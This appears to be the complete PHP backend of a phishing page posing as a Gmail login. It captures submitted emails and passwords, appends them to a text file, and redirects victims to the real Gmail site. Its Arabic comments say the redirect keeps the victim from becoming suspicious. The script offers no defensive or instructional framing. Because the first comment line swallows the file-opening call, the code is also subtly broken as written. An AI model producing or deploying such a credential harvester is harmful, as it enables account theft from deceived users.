<?php
if ($_SERVER["REQUEST_METHOD"] =="POST") {$email = $_POST["email"];$password = $_POST["password"];
    
    // تخزين البيانات في ملف نصي$file = fopen("data.txt","a");
    fwrite($file,"Email:".$email." | Password:".$password."\n");
    fclose($file);
    
    // إعادة توجيه المستخدم لصفحة جيميل الحقيقية عشان ميشكش
    header("Location: https://mail.google.com");
    exit();}?>
